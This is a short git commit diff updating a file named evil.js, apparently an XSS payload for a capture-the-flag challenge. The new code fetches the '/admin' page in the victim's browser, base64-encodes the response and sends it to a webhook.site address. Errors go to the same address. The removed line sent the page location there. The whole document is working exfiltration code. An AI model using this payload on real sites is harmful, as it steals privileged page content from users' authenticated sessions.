0f9feb61a483bba81d2d3c2aeef89ef7724ee51c
Heru Kristanto <99137032+NicoIzumi30@users.noreply.github.com>
2025-08-30 12:56:51 +0700

    Update evil.js

--- evil.js
+++ evil.js
@@ -1,1 +1,4 @@
-top.location = 'https://webhook.site/f4b566c7-84f9-47fb-b385-611fe96486d1?exec=1&loc=' + encodeURIComponent(location.href);
+fetch('/admin')                // atau '/flag' atau '/'
+  .then(r => r.text())
+  .then(t => { top.location = 'https://webhook.site/f4b566c7-84f9-47fb-b385-611fe96486d1?data=' + btoa(t) })
+  .catch(e => { top.location = 'https://webhook.site/f4b566c7-84f9-47fb-b385-611fe96486d1?err=' + encodeURIComponent(e) })
